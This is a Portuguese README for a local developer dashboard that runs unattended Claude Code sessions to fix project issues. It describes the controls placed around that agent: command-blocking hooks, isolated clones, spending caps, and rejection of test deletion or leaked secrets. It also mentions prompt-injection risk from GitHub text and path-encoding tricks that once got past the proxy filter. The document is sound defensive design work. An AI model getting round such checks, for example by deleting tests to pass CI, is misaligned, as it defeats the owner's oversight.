# HUB do dev

Uma pergunta só: **"o que precisa de mim agora?"** — respondida em menos de um
segundo, sem clicar em nada, com um botão para agir em cada item.

Não é um painel de "como estão meus projetos". Essa pergunta produz uma tela
bonita que se olha uma vez por semana. Esta produz uma tela que se abre todo dia.

## Rodar

```
python servir.py
```

Abre em **http://localhost:4777**. `Ctrl+C` encerra.
`python servir.py 4780 30` troca a porta e o intervalo da camada local.

Só escuta em `127.0.0.1`: o HUB lê git, Docker e o GitHub autenticado, então
exposto na rede vira porta de entrada.

Sem build, sem `npm install`, sem dependência externa. Precisa de Python 3.12,
`git`, `docker` e o `gh` já autenticado (`gh auth status`).

## As peças

| Arquivo | Papel |
|---|---|
| `index.html` | A tela. Recarrega sozinha a cada 15 s. |
| `servir.py` | Serve a página, o `/api/dados`, o `/api/acao` e o `/api/execucao`. Agenda as três coletas. |
| `banco.py` | O SQLite (`hub.db`): uma linha por (projeto, camada), com carimbo de tempo. |
| `regras.py` | O motor das 17 pendências, mais o agrupamento das repetidas. Puro: entra dicionário, sai lista. |
| `memoria.py` | A memória do tempo: idade de cada pendência, tendência da semana e o briefing. |
| `test_memoria.py` | 46 testes da memória. `python test_memoria.py`. |
| `execucao.py` | O botão **Resolver**: dispara uma sessão do Claude Code numa cópia isolada e abre o pedido de alteração. Seção própria abaixo. |
| `test_execucao.py` | 90 testes das decisões do Resolver e das barreiras. `python test_execucao.py`. |
| `barreira.py` | O porteiro do `Bash` da sessão desacompanhada: roda como hook do `claude` e barra o comando **antes** dele rodar. |
| `test_barreira.py` | 36 testes da barreira — cada um é um ataque concreto ou um comando honesto. `python test_barreira.py`. |
| `test_regras.py` | 67 testes do motor. `python test_regras.py`. |
| `test_servir.py` | 46 testes do proxy do grafo e da superfície do Resolver. `python test_servir.py`. |
| `coletar.py` | Camada **local**: git, Docker, portas, grafo, memória, variáveis. |
| `coletar_github.py` | Camada **github**: CI, PRs, alertas, o site no ar e o último deploy. Uma consulta GraphQL em lote. |
| `test_coletar.py` | 94 testes dos pedaços dos coletores que já erraram. `python test_coletar.py`. |
| `coletar_pesado.py` | Camada **pesado**: cota do Actions e `npm audit`. |
| `test_coletar_pesado.py` | 12 testes da auditoria de dependência. `python test_coletar_pesado.py`. |
| `fila.py` | A fila desacompanhada: escolhe a pendência, escolhe o trilho e segura o teto de gasto do dia. |
| `test_fila.py` | 92 testes da fila. `python test_fila.py`. |
| `casos.json` | Camada **curada**, escrita à mão. Nenhum coletor toca aqui. |

`hub.db` é descartável e não é versionado: apagar só custa uma coleta — e, desde
25/08/2026, também zera a memória do tempo, que se reconstrói sozinha a partir da
coleta seguinte.

**483 testes no total**, todos em `unittest` da biblioteca padrão, e todos os oito
arquivos rodam na CI. Passam em Windows e em Linux — verificado num contêiner
`python:3.12-slim`, porque o núcleo vai rodar em Linux na VPS.

## As três cadências

| Camada | De quanto em quanto | O que mede | Por quê |
|---|---|---|---|
| local | 60 s | git, Docker, portas, idade do grafo, memória, variáveis | só disco, é barato |
| github | 20 min | CI, pedidos de alteração, alertas de segurança, **o site no ar e o que já foi publicado** | rede e cota — nada disso muda em um minuto |
| pesado | 24 h | cota de minutos do Actions, `npm audit` | caro: várias chamadas e rede por repositório |

**A tela nunca espera coleta.** Lê o último valor do banco, mostra na hora e
troca o número quando o novo chegar. Cada camada exibe há quanto tempo foi
medida e esmaece quando envelhece — se o painel mentir uma vez, o hábito morre.

## As 16 pendências

| # | Regra | Gravidade | Ação |
|---|---|---|---|
| 1 | CI vermelha | alta | abrir o que falhou |
| 2 | Container que devia estar no ar e caiu | alta | subir |
| 3 | Alerta de segurança aberto (Dependabot) | alta se houver crítico ou alto, senão média | ver os alertas |
| 4 | Trabalho não commitado há mais de 1 dia | alta | abrir no VS Code |
| 5 | Commit só no disco | alta | enviar ao GitHub |
| 6 | Memória do projeto em CRLF | alta | converter |
| 7 | Cota do Actions acima de 80% | alta | ver o consumo |
| 8 | Grafo de código ausente ou com mais de 7 dias | média | copiar o pedido |
| 9 | Pedido de alteração parado há 7 dias | média | abrir |
| 10 | Dependência com correção de segurança | média | copiar o comando |
| 11 | Exemplo de variáveis divergente do real | média | copiar as diferenças |
| 12 | Sem commit há mais de 30 dias | baixa | abrir e decidir |
| 13 | Sem cópia no GitHub | baixa | copiar o comando |
| 14 | Sem descrição no `casos.json` | baixa | escrever |
| 15 | Site de produção fora do ar | alta | abrir o site |
| 16 | Trabalho pronto no GitHub e não publicado | média | ver as publicações |

Três invariantes, cobertos por teste:

1. **Toda pendência tem uma ação.** Sem o que fazer, não é pendência: é
   estatística, e estatística vai para a tabela de baixo.
2. **Ausência não é falha.** Camada não coletada deixa o motor calado sobre ela.
   Inventar "CI vermelha" porque o número não chegou queima a confiança.
3. **O id é estável** (`regra:projeto`) — é o que faz "esconder por 24 h" durar.

O **×** de cada item esconde a pendência por 24 horas. A decisão fica no banco e
sobrevive à recoleta.

### Duas regras merecem explicação

**Regra 2 só dispara com o projeto aberto no VS Code.** É o critério pelo qual o
`vigia-vscode` sobe e derruba o Docker desta máquina. Sem esse filtro a caixa
nasce com seis alarmes de projeto fechado — nenhum deles pendência, todos
ensinando o dono a ignorar a lista inteira.

**Regra 6 existe porque o erro é calado.** Arquivo de memória em CRLF faz o
harness ignorar o frontmatter, e a memória nunca carrega. Nada na tela avisa.

## A fila que conserta — o painel deixa de só apontar

Até aqui o painel apontava e você resolvia um item por vez, a dedo. A **fila**
pega a lista de pendências, escolhe a ordem sozinha e trabalha desacompanhada
até acabar serviço, dinheiro ou paciência. Ela só começa quando você aperta
**"Trabalhar na fila"** — não há agendador, e isso é decisão, não pendência.

### Três trilhos

| Trilho | Quem faz | Custo | O que sai |
|---|---|---|---|
| **Renovate** | um robô do GitHub, fora do painel | grátis | pedido de alteração de dependência |
| **Mecânico** | o próprio painel, sem IA | **R$ 0,00** | o arquivo corrigido, direto |
| **Claude** | uma sessão do Claude em cópia sem acesso ao GitHub | pago, teto de US$ 3 por item — ou menos, se o dia ja gastou | pedido de alteração |

**Estado em 25/08/2026 — o Renovate saiu do papel.** Está instalado em todos
os repositórios da conta `garcia-goncalves` (plano Community, gratuito), em modo
`Interactive`, e todo repositório novo entra sozinho. A configuração é **uma
só** e vive em `garcia-goncalves/renovate-config`; cada repositório carrega
apenas um `renovate.json` de três linhas apontando para lá. Ela é contida de
propósito: as atualizações pequenas viram um pedido por semana, versão maior
espera aprovação, e nada com menos de 24 horas de publicado é adotado — a janela
em que um pacote comprometido ainda não foi despublicado. O motivo do aperto é a
cota do GitHub Actions, medida em 88% (2.646 de 3.000 min em 30 dias).

**Automesclagem, ligada em 25/08/2026 — e só onde ela significa alguma coisa.**
Correção de falha de segurança pequena (`patch` e `minor`) entra sozinha quando
a CI fica verde; versão maior nunca entra sozinha. A regra vive no preset
central, mas **seis dos dez repositórios a desligam** por escrito no próprio
`renovate.json`, e o motivo está lá dentro: em `fristachiodontologia` e
`medconsultoria-crm` não existe CI nenhuma, então "CI verde" seria uma frase
vazia — mesclar sem verificação alguma; em `medconsultoria`, `odontologia-pericia`,
`ccvp-painel` e `zacareli` o deploy dispara em `push` na `main`, então
automesclar não seria mesclar, seria **publicar em produção sem ninguém olhar**.
Sobram quatro onde a automesclagem é honesta: `painel-projetos`, `investrix`,
`grimoire` e `workspace-medconsultoria` — todos com CI rodando em `pull_request`
e deploy só por botão. Quem ganhar CI, ou trocar o deploy por botão, apaga o
bloco do seu `renovate.json` e volta ao padrão da organização.

Só **três** das 17 regras entram na fila: `memoria_crlf` (mecânico),
`env_drift` e `dependencia_insegura` (Claude). É lista **branca**: regra que não
está lá não chega ao motor, nem por engano.

**A fila só existe porque as barreiras existem.** Sem ninguém olhando a tela, a
sessão do Claude deixa de ser uma ferramenta vigiada e passa a ser um programa
solto na sua máquina. As três barreiras — cópia sem acesso ao GitHub, sessão sem
configuração de arquivo, e lista de comandos — estão descritas em "O que este
recurso NÃO isola", inclusive no que elas **não** cobrem.

**`ci_vermelha` fica de fora de propósito.** É o caso mais valioso e o único em
que *apagar o teste parece uma correção*. Enquanto a trava do teste apagado não
tiver histórico de acerto, ela não entra.

**`grafo_velho` fica de fora porque não cabe.** A ação dela hoje é copiar um
texto para você colar; reindexar acontece pelo MCP do grafo, e o painel não
dirige o MCP — ele só serve a tela do grafo por procuração.

### As quatro travas, todas verificadas em código

Nenhuma delas é uma instrução no texto do pedido. Instrução em texto é sugestão;
trava é código que recusa.

1. **Teto de R$ 50 por dia.** No ponto exato do teto já não cabe mais um item.
   "Só mais um" é como conta de R$ 300 acontece. O teto do dia limita o teto
   **da sessão** (`fila.teto_da_sessao`): com R$ 49 gastos, a sessão sai com
   teto de R$ 1, e não com os R$ 15,42 de sempre. Sem isso — e era assim até
   25/08/2026 — a fila conferia o teto *antes* do item e o dia podia fechar
   em R$ 64 sem nunca ter "estourado". O botão **Resolver** também conta:
   ele dispara a mesma sessão e o custo dele entra na tabela `gasto`, que
   `banco.gasto_entre` soma junto com a fila.
2. **Anti-laço: duas tentativas por item**, e falha de hoje não volta hoje. Uma
   correção que não pega vira torneira aberta de madrugada.
3. **Teste apagado.** Antes de publicar, o painel lê o diff. Apagou um arquivo
   de teste (`test_*.py`, `*_test.*`, `*.test.*`, `*.spec.*`) ou desligou um
   teste (`@unittest.skip`, `pytest.mark.skip`, `it.skip(`, `xit(`…)? Reprovado.
   **Tirar** um skip passa de propósito: religar um teste é o oposto de burlar.
4. **Segredo no arquivo de exemplo de ambiente.** Linha nova só pode ser
   `CHAVE=`. Com qualquer coisa depois do `=` — inclusive um espaço reservado
   que pareça inofensivo — o item é reprovado. O custo de errar para o lado
   frouxo é um segredo no histórico do git, e rotacionar segredo é varredura no
   repositório inteiro, não a edição de uma linha.

As travas 3 e 4 ficam no **último instante antes de publicar**, dentro do
`execucao.py`, porque é o único ponto por onde todo caminho passa — botão,
paleta e fila.

### O teto usa a data local, não a UTC

O resto do banco carimba em UTC. O teto, não. Em UTC−3, às 21h de terça já é
quarta em UTC: o teto zeraria três horas cedo e a surpresa seria de madrugada,
sem ninguém entender por quê.

**Risco aceito:** o `hub.db` é descartável. Apagar o banco no meio do dia zera o
gasto acumulado e devolve os R$ 50 inteiros. É ato deliberado seu, não acidente
— fica registrado aqui e não vira código.

### O que a regra 6 (CRLF) deixou de apontar

O `MEMORY.md` saiu do varredor. O motivo da regra é *"em CRLF o harness ignora o
frontmatter e a memória nunca carrega"* — e esse arquivo, por especificação,
**não tem** frontmatter: ele é o índice, uma linha por memória. Não há cabeçalho
para ser ignorado, logo não há falha a apontar. Conferido em 25/08/2026: dos 13
arquivos `.md` da pasta de memória deste projeto, ele é o único sem `---`.

## A paleta de comandos (`Ctrl+K`)

Uma porta de entrada só. `Ctrl+K` (ou `Cmd+K`) abre uma caixa de busca; digitar
`dents` cai no projeto, digitar `subir` sobe contêiner, digitar `grafo` abre a
aba do mapa de código. Com 17 repositórios, menu em árvore vira caça ao tesouro.

O botão **"Buscar projeto ou ação  `Ctrl K`"** fica visível no cabeçalho de
propósito: atalho que só existe no teclado é atalho que ninguém descobre.

### O que entra na lista

Hoje são ~76 comandos, montados a cada abertura a partir do que a tela já sabe:

1. **Toda pendência da caixa**, com a ação dela pronta (as urgentes vêm com selo
   vermelho).
2. **Cada projeto**, com as portas de entrada que **existem** para ele: abrir no
   VS Code, subir os contêineres (só se tem compose), enviar ao GitHub (só se há
   commit parado), abrir no GitHub, abrir o site no ar (só se tem `url_prod`),
   abrir o endereço local (só se a porta está viva de fato).
3. **Comandos da máquina**: medir de novo, atualizar GitHub, abrir o grafo,
   trocar o tema.

Item que abre nada é pior que item ausente, então nada entra "por via das
dúvidas".

### Como a busca ordena

Quatro níveis, do melhor para o pior: nome igual → começa com → contém →
**letras na ordem** (`wsmed` acha `workspace-medconsultoria`). Acento e hífen
são ignorados dos dois lados — `ajudei saude` acha `Ajudei-Saúde`, que é como
uma pessoa digita.

Uma regra de desempate merece explicação. Digitar o **nome inteiro** de um
projeto põe *"Abrir no VS Code"* em primeiro, mesmo havendo pendência desse
projeto — quem digita `dents` quer o dents. Mas digitar **letras soltas** deixa a
pendência urgente ganhar: ali o dono não sabe o nome, está procurando o que
precisa dele. É o `BONUS_NOME` no `index.html`.

### O que ela deliberadamente não faz

**A paleta não tem ação própria nenhuma.** Ela encontra e dispara o que já
existe: mesma função `agir()` (ou `resolver()`, para o botão Resolver), mesma
lista branca do `servir.py`. Digitar `resolver` acha
"Resolver com o Claude: …" para cada pendência que pode ser resolvida — é a
mesma função do botão, não uma segunda porta com regra própria. Se pudesse
fazer algo que a tela não faz, viraria uma segunda superfície de risco para
revisar a cada mudança. Um teste amarra isso (`PaletaNaoInventaComando`, no
`test_servir.py`): ele lê os comandos que o `index.html` manda e exige que cada
um exista no servidor.

### Detalhes de implementação

Escrita à mão em ~200 linhas, sem `cmdk` nem `kbar`, porque as duas custariam
build e dependência — as duas virtudes que este projeto tem.

Usa `<dialog closedby="any">` com `showModal()`: o navegador dá de graça o foco
preso dentro, `Esc` fechando, clique fora fechando e camada acima de tudo sem
guerra de `z-index`. Safari ainda não tem `closedby`, então há um fallback de 8
linhas para o clique fora. Navegação é `↑` `↓` `Home` `End` `Enter`, com o
padrão ARIA de `combobox` + `listbox` e `aria-activedescendant` para leitor de
tela.

**Não há teste automatizado da busca em si** — o projeto não tem executor de
teste JavaScript, e instalar um quebraria "zero dependência, zero build". Foi
verificada no navegador em 24/08/2026 com estes casos: `dents`, `wsmed`,
`ajudei saude`, `subir`, `grafo`, `tema`, termo sem resultado, e navegação por
seta com volta ao fim da lista.

## A nota de prontidão, e por que ela mentia

A coluna **Prontidão** dá a cada projeto uma nota de 0 a 100. Ela é a soma dos
pesos dos critérios cumpridos, dividida pela soma dos pesos que **se aplicam
àquele projeto** — e essa segunda metade da frase é nova.

### O defeito (medido em 24/08/2026)

A régua era uma só para os 17 projetos: dez critérios, 14 pontos, cobrados de
todo mundo. O resultado era uma nota que descontava de cada projeto aquilo que
ele não tinha motivo nenhum para ter.

O caso mais claro era o próprio painel: **64%**, descontado por não ter
contêiner, não ter arquivo de variáveis e não ter workflow de publicação. As
três coisas são decisões declaradas deste projeto — "zero dependência e zero
build" está na especificação, e ele nunca vai para servidor nenhum. A nota não
media dívida técnica; media distância de um projeto imaginário.

Pior: o critério de maior peso da régua (2 pontos, junto com CI e testes) era
*"sem arquivo de variáveis na raiz"* — ou seja, reprovava a **existência** do
arquivo. Mas local é de mentira e servidor é de verdade: ter esse arquivo com
senha de teste é exatamente o certo. O item derrubava 6 dos 17 projetos por
fazerem a coisa certa. O risco real nunca foi o arquivo existir; é ele estar
dentro do histórico do git — e é isso que passou a ser medido.

### Como ficou

Todo critério agora tem duas perguntas, não uma: **cabe cobrar isto deste
projeto?** e só então **ele cumpre?**. O que não se aplica **sai do
denominador** — não vira ponto de graça (isso inflaria a nota) nem falta (isso
era o defeito), simplesmente some da conta.

| Critério | Peso | Cobrado de quem |
|---|---|---|
| README | 1 | todos |
| Árvore limpa e enviada | 1 | quem tem git |
| CI configurada | 2 | quem tem git **e** cópia no GitHub |
| Testes automatizados | 2 | quem tem ≥ 500 linhas em linguagem com lógica |
| Docker / compose | 1 | quem declara contêiner no `casos.json`, ou já tem Dockerfile |
| Exemplo de variáveis | 1 | quem usa variáveis de ambiente |
| Workflow de deploy | 2 | quem tem `url_prod` no `casos.json`, ou já tem o workflow |
| Pasta `docs/` | 1 | projetos com ≥ 100 arquivos |
| `.gitignore` | 1 | quem tem git |
| Segredo fora do histórico | 2 | quem tem arquivo de variáveis, versionado |

Os dois limiares (`LIMIAR_DOCS`, `LIMIAR_TESTES`) e a lista
`LINGUAGENS_TESTAVEIS` ficam no topo do `coletar.py`, num lugar só.

O critério de testes fica calado em site de HTML e CSS: a regra da casa isenta
CSS, layout e texto de tela de TDD, e cobrar suíte de teste de uma página
estática é a mesma acusação vazia de antes, com outro nome.

### A palavra final é do dono

A detecção automática erra para os dois lados. Qualquer projeto pode ligar ou
desligar qualquer critério pelo `casos.json`:

```json
"meu-projeto": {
  "titulo": "...",
  "prontidao": { "deploy": false, "docker": true }
}
```

`false` tira o critério da conta; `true` força a cobrança mesmo sem evidência no
disco. A tela marca esses itens como *"desligado por você"* / *"exigido por
você"*, para a nota nunca parecer automática quando não é.

### A tela passou a mostrar a conta

O número aparecia sozinho, em vermelho, sem dizer de que era feito. Número sem
conta não é medida, é acusação. Clicar na porcentagem abre os dez critérios em
três estados — **✓ feito**, **✗ falta**, **— não se aplica** — com o peso de
cada um e o total aplicável.

A tabela inteira é redesenhada de 15 em 15 segundos. A lista `CONTAS_ABERTAS`
(no `index.html`) guarda o que está aberto **por nome de projeto**, não por
elemento, porque os elementos morrem a cada redesenho — sem isso a gaveta
fechava sozinha no meio da leitura.

### O efeito nos 17 projetos

Doze subiram, um caiu, dois ficaram iguais. Os movimentos maiores:
`medconsultoria-crm` 50 → 83, `odontologia-pericia` 29 → 60, `investrix` 71 →
100, o próprio painel 64 → 86.

Dois casos merecem leitura, porque **não** são inflação:

- **`Ajudei-Saude` caiu 93 → 92.** Antes ele ganhava 2 pontos de graça por *não*
  ter arquivo de variáveis. Agora o critério não se aplica a ele e sai da conta,
  em vez de virar brinde. Nota menor, medida mais honesta.
- **`museu-particular-bkp` caiu 14 → 0.** É uma pasta de backup, sem git e com
  12 arquivos: o único critério que cabe cobrar dela é o README, e ela não tem.
  0% aqui não é "projeto péssimo", é "quase nada a medir". Se incomodar, o
  caminho é tirar a pasta de `source/`, não afrouxar a régua.

## O grafo de código embutido

A aba **Grafo de código** mostra o mapa de funções, chamadas e dependências dos
seus projetos, servido dentro do próprio HUB em `/grafo/*`. São três coisas
distintas, e vale entender por quê.

**a) Ele não é um servidor independente.** A porta 9749 é a tela de um servidor
MCP que fala por `stdin`. Medido em 24/08/2026: com o `stdin` fechado, o
processo registra `ui.serving` e em seguida `server.shutdown` **no mesmo
segundo** — a porta abre e fecha, e a tela fica em branco sem erro nenhum. O que
o segura de pé é o cano de entrada **aberto**. Por isso o botão **Ligar o
grafo** guarda o processo em `_grafo_proc` e nunca fecha esse cano.

Consequência aceita de propósito: **o grafo vive enquanto o HUB viver, e morre
junto**. É melhor que a alternativa — este binário já congelou a máquina duas
vezes por consumo de memória, e processo órfão ninguém lembra de matar.

**b) Quatro estados na tela**, não dois:

| Estado | O que aparece |
|---|---|
| No ar | o grafo, embutido |
| Fora do ar | cartão com o botão **Ligar o grafo** |
| Subindo | contador; a tela aparece sozinha quando ele responder |
| Sem o programa | cartão explicando que não há o que ligar |

**c) Montagem preguiçosa.** O quadro do grafo **não existe no DOM** até você
clicar na aba. Grafo pesado dentro de painel é a receita clássica de painel que
demora a abrir.

### O que o proxy precisa reescrever, e por quê

A tela do grafo pede caminho **absoluto**: `/api/...`, `/assets/...` e `/rpc`.
Servida sob `/grafo/`, ela pediria `/api/index-status` na raiz do HUB — onde
mora o `/api/dados` do painel. Por isso o proxy reescreve o corpo de texto.

O defeito que só o navegador mostrou (24/08/2026): a primeira versão cobria
apenas aspas simples e duplas, mas a tela monta `` `/api/layout?...` `` e
`` `/api/browse${...}` `` **com crase**. Resultado: a visualização do grafo
respondia `HTTP 404` sem dizer de onde vinha. A reescrita cobre as três aspas —
e de propósito **não** toca `` `/${e}` ``, que no mesmo pacote junta caminho de
pasta, não URL.

## Segurança

O servidor executa `git push`, `docker compose up` e abre o VS Code. Escutar só
em `127.0.0.1` protege contra a rede, mas não contra o navegador do próprio dono:
qualquer site aberto em outra aba pode disparar um POST para `localhost:4777`.
Por isso toda ação exige as três coisas:

1. um **token** sorteado a cada inicialização, injetado apenas na página servida;
2. cabeçalho `Origin` da própria origem;
3. cabeçalho `Host` de `localhost` (barra DNS rebinding).

E o cliente **nunca manda caminho** — manda o nome do projeto, e o caminho vem do
banco. Não existe ação que rode em pasta escolhida por quem chamou.

O servidor publica **só** a página e os três arquivos de ícone. Todo o resto
responde 404, e `HEAD` responde 405 — sem isso ele caía no handler de arquivos
padrão e revelava existência, tamanho e data de qualquer arquivo da pasta — o banco, o `casos.json` e o `.git/` não ficam acessíveis.

**Segredo nenhum entra no banco ou na tela.** O coletor abre o arquivo de
variáveis só para extrair **nomes** de variável. Quem autentica no GitHub é o
`gh` que o dono já logou.

### A rota do botão "Resolver" (`/api/execucao`)

`resolver` e `parar` entram pelo **mesmo** `/api/acao` de sempre, e portanto pela
mesma cadeia de três checagens acima — nada foi afrouxado para eles. Quem recusa
uma pendência que não pode ser resolvida é o **servidor**, não a tela: esconder o
botão é conveniência, a barreira é `execucao.pode_resolver`.

A consulta do progresso é um **GET** (`/api/execucao?desde=N`), e aí há uma
diferença que precisa ser dita, senão parece um afrouxamento: o navegador **não
manda `Origin` em GET de mesma origem**. Uma rota GET que exigisse `Origin`
responderia 403 para sempre. Ela exige, em vez disso, `Host` de `localhost`, o
**token** (igual ao POST) e `Sec-Fetch-Site` de mesma origem — exatamente o par
que o proxy do grafo já usa, e pelo mesmo motivo.

**O que este recurso acrescenta de superfície, dito sem maquiagem:** o servidor
passa a executar `claude`, `git push` de um ramo novo e `gh pr create`. O prompt
vai por **entrada padrão**, nunca pela linha de comando — nesta máquina `claude`
é um `.CMD`, e todo argumento de um `.CMD` passa pelo interpretador do Windows.
E a sessão filha herda os hooks do dono: ver "O que este recurso NÃO isola".

### O preço de embutir o grafo na mesma origem

Mesma origem faz sumir de uma vez o `SameSite` dos cookies e o CORS, mas cobra:
um quadro de mesma origem **lê o DOM da página que o contém**, inclusive o token
de ação. Isso é **aceito conscientemente** — o binário do grafo já roda como MCP
com acesso total ao código e ao disco desta máquina, e o token só acrescenta
`git push`, `docker compose up` e abrir o VS Code, que qualquer processo local
já faz.

Quem resolve o enquadramento não é a mesma origem: é o proxy **não repassar
`frame-ancestors`**. O fornecedor do grafo manda `frame-ancestors 'none'` — uma
recusa explícita de ser embutido — e este desenho a contorna por conta própria.
Fica registrado aqui, não escondido no código.

O que **não** é aceito, e por isso é barrado:

- **Pedido vindo de outro site**, seja `GET` ou `POST`: o proxy exige
  `Sec-Fetch-Site: same-origin`, cabeçalho que navegador nenhum deixa
  JavaScript forjar. Até a revisão de 24/08/2026 isso valia só para o `POST`, e
  qualquer aba aberta do dono podia varrer a API do grafo por `GET` — inclusive
  a rota que **lista pasta do disco**.
- **`/api/process-kill` não passa**, nem disfarçado. Comparar texto cru não
  bastava: `%65`, `//`, `/./` e `#` furavam o filtro, porque quem decide o que
  esses caracteres significam é o servidor de destino. Agora o caminho é
  decodificado e normalizado **antes** de comparar.
- **A política de segurança do fornecedor volta para o navegador.** O proxy
  descartava a `Content-Security-Policy` do grafo, e o código de terceiro
  passava a rodar **sem política** na origem que guarda o token. Isso importa
  menos pelo binário (que já tem o disco inteiro) e mais pelo que ele
  **indexa**: nome de função e caminho de arquivo vindos de um repositório
  hostil são desenhados por essa tela. Agora a política é repassada inteira,
  menos `frame-ancestors`, mais `X-Content-Type-Options: nosniff`.
- **O token não vaza para o grafo.** Sobem apenas `Accept` e `Content-Type`, já
  achatados numa linha; `X-Token`, `Cookie`, `Authorization` e `Origin` ficam.
- **`/grafo/../api/dados` é recusado**, não normalizado.
- **Resposta comprimida vira erro 502**, não tela em branco. O proxy não pede
  compressão, mas isso é suposição sobre binário de terceiro: se ele comprimir
  mesmo assim, reescrever produziria lixo rotulado como JavaScript, e a tela
  ficaria branca sem log nenhum.

Uma alternativa que **não** foi tomada, e vale saber que existe: servir o proxy
numa **origem separada** (uma segunda porta atendendo só `/grafo/*`). O quadro
deixaria de ser mesma origem e perderia o acesso ao token, ao custo de ~10
linhas e de mais uma porta na máquina. Com a política do fornecedor restaurada,
o ganho ficou pequeno o bastante para não pagar o preço agora.

### O que a revisão de segurança pegou (24/08/2026, antes de ir para a `main`)

- **Vazamento de segredo, corrigido.** Ler o arquivo de variáveis linha a linha
  não bastava: num valor multilinha entre aspas — chave RSA, certificado,
  credencial — a última linha de um bloco PEM termina em `=` e casava como se
  fosse nome de variável. O pedaço da chave ia para o banco, para a tela e para
  o botão "Copiar as diferenças". Agora o leitor pula tudo que está dentro de um
  valor com aspas ainda abertas, e nome de variável tem limite de 64 caracteres.
  `test_coletar.py` tranca isso.
- **Pasta publicada, fechada.** Ver acima.
- **`Origin` ausente deixou de passar.**
- **Abrir o VS Code** não usa mais `shell=True`.
- **O coletor não executa mais código de fora do repositório.** A detecção de
  "projeto aberto no editor" lia e *executava* `~/.claude/scripts/vigia-vscode.py`
  a cada 60 s — uma pasta que sessões de agente escrevem com frequência, dentro
  de um processo que escuta em rede e roda comandos. Agora lê as marcas que o
  próprio vigia grava em `~/.claude/state/vigia`: mesma verdade, zero execução.
- **Nome de repositório remoto** é validado contra o alfabeto do GitHub antes de
  entrar na consulta GraphQL.

## O botão "Resolver" — o Claude dentro do painel

Cada pendência que tem projeto ganha, **ao lado** da ação de sempre, um botão
`Resolver`. Ele dispara uma sessão do Claude Code que tenta corrigir a causa da
pendência e termina abrindo um **pedido de alteração** (pull request) no GitHub.

O cano inteiro, em seis passos:

1. O navegador manda **só o `id`** da pendência. O servidor **recalcula** a
   pendência a partir do banco (`_pendencia_por_id`) e ignora todo o resto do
   corpo. Isso fecha o prompt para o navegador — mas **não** para o mundo: o
   banco guarda o que o coletor leu da API do GitHub, e ali há texto que
   estranhos escreveram. Ver "O texto de estranho que quase virou comando".
2. O painel cria uma **cópia isolada** do repositório — um `git clone` local
   com o `origin` **removido** — em
   `~/.cache/hub-worktrees/<projeto>/<8 caracteres>`, de propósito **fora** de
   `source\repos`, porque toda subpasta daquela raiz vira projeto medido e o
   painel passaria a medir as próprias cópias. Até 25/08/2026 isso era um
   `git worktree`, e a diferença não é de detalhe: ver
   "O que este recurso NÃO isola".
3. A sessão roda **dentro da cópia**. A pasta original do projeto não é tocada,
   e `git status` nela continua vazio durante e depois.
4. O painel lê a saída linha a linha e mostra o progresso ao vivo: uma frase em
   português, o log cru com carimbo de hora, e o custo.
5. Terminou bem: commit **na cópia**; o painel traz o ramo para o projeto de
   verdade com `git fetch`, e só então faz `git push` de um ramo `hub/...` e
   `gh pr create`. O push sai do **painel**, nunca da sessão — a cópia não tem
   para onde empurrar. **Nunca** `push` na `main`, **nunca** `gh pr merge`.
5b. **Parar sem confirmação não libera a vez.** Se o `Parar` pede a morte e o
   processo não responde em 5 segundos, o painel **guarda** a referência dele em
   vez de descartá-la, e recusa um novo `Resolver` enquanto aquele processo
   respirar. A versão anterior largava a referência: o `claude` seguia vivo
   cobrando na API, sem ninguém para matá-lo, e um segundo clique subia uma
   sessão paralela cobrando junto. Pela mesma razão, se a leitura da saída morre
   no meio, o painel mata a árvore do processo antes de marcar falha.
6. Sucesso **descarta** a cópia; falha **preserva** a cópia em disco, para o
   dono poder olhar o que aconteceu.

Só há **uma execução por vez na máquina inteira**. A trava mora no servidor, não
no navegador: fechar a aba, recarregar a página ou abrir outra não perde nada nem
libera uma segunda sessão.

### O que se vê na tela

O botão abre um `<dialog>` que mostra, enquanto roda: a **frase de status** em
português, o **log cru** com carimbo de hora, o **custo** e o botão **Parar**. A
tela pergunta ao servidor de 1 em 1 segundo, mandando quantas linhas já tem, para
receber só o que falta.

Quando termina bem: o **link do pedido de alteração** e duas abas —
**Resumo** (uma frase por arquivo tocado, escrita pela própria sessão) e
**Diff**. As abas **não fazem requisição nenhuma**: os dois textos já vieram
juntos no estado final.

Três comportamentos que valem dizer:

- **Fechar não para nada.** `Esc` fecha a janela; a sessão continua no servidor.
  Enquanto ela roda, o botão daquela pendência vira **"Ver execução"**, e clicar
  reconecta ao que está acontecendo — inclusive o log inteiro desde o começo.
- **Os outros botões do painel continuam clicáveis.** O `Resolver` é um segundo
  executor, ao lado do `agir()` de sempre, e de propósito **não** usa a trava
  `ocupado` do cliente — essa trava agora é do servidor.
- **O log não some.** O `recado()` do painel apaga em 4 ou 9 segundos; um log que
  evapora enquanto o dono lê é pior que log nenhum.

O botão aparece **só onde há o que resolver**: pendência sem projeto (a de cota
do Actions nasce assim, de propósito) e projeto bloqueado ficam só com a ação de
sempre. Um botão que existe para dizer "não" é o oposto do invariante "toda
pendência tem uma ação".

### O teto de gasto é aproximado, e isso não é força de expressão

Medido nesta máquina em 24/08/2026: com `--max-budget-usd 0.10`, a execução
terminou custando **US$ 0,44548** — estouro de 4,5×. A flag não é uma cerca; é
um pedido. O teto adotado é **US$ 3** por execução — ou o que sobra do teto do dia,
se for menos (`fila.teto_da_sessao`) — e a única garantia real de
parar é o botão **Parar**, que mata a árvore de processos e espera 5 segundos
pela confirmação. Se não confirmar, a tela diz que **não** confirmou — não finge
que parou.

O custo aparece em reais, por uma cotação constante no código
(`execucao.USD_BRL`, R$ 5,14, fechamento de 21/08/2026). E ele **fica parado até
a sessão terminar**: foi medido que só o evento final traz o custo. Inventar uma
tabela de preços por token daria um número que se mexe e está errado.

### Quando o pedido de alteração NÃO abre

Três casos, cada um com uma tela própria — nenhum deles diz "algo deu errado":

- **A sessão não mexeu em nada.** A tela diz "Terminou sem alterar nenhum
  arquivo", e não finge que abriu pedido.
- **O projeto não tem cópia no GitHub.** Sem `origin` não há para onde enviar. A
  correção e o ramo ficam preservados no projeto, e a tela diz isso.
  (Medido: o `medconsultoria-crm` está nesse caso.)
- **O envio falhou.** A cópia é preservada com a mudança dentro, e o log cru do
  `git`/`gh` aparece na tela.

**Um detalhe que custou caro descobrir:** a sessão filha **commita por conta
própria**. O prompt proíbe `push` e pull request, não commit. Por isso o painel
não pergunta apenas "há arquivo alterado?" — ele compara o commit atual da cópia
com o commit de onde ela partiu. Sem isso, uma correção já commitada era lida
como "nada mudou", a cópia era descartada e a tela anunciava um pedido que nunca
